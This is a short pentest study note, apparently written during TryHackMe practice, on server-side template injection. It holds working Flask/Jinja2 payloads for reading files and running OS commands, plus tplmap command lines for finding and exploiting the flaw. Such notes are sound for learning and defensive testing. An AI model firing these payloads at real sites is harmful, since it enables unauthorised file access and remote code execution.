# SSTI
#pentest/tryhackme

## What
Server Side Template Injection. Happens when the website evaluates user input through a templating engine.

## Payloads
* [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection)

## Example of Flask's template evaluation
* Read a file:  `{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}} `
* Execute a command: `{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}`

## Tool to evaluate SSTI
* [GitHub - epinna/tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool](https://github.com/epinna/tplmap)

The basic syntax for tplmap is different depending on whether you're using get or post
`GET   tplmap -u <url>/?<vulnparam>`
`POST tplmap -u <url> -d '<vulnparam>'`



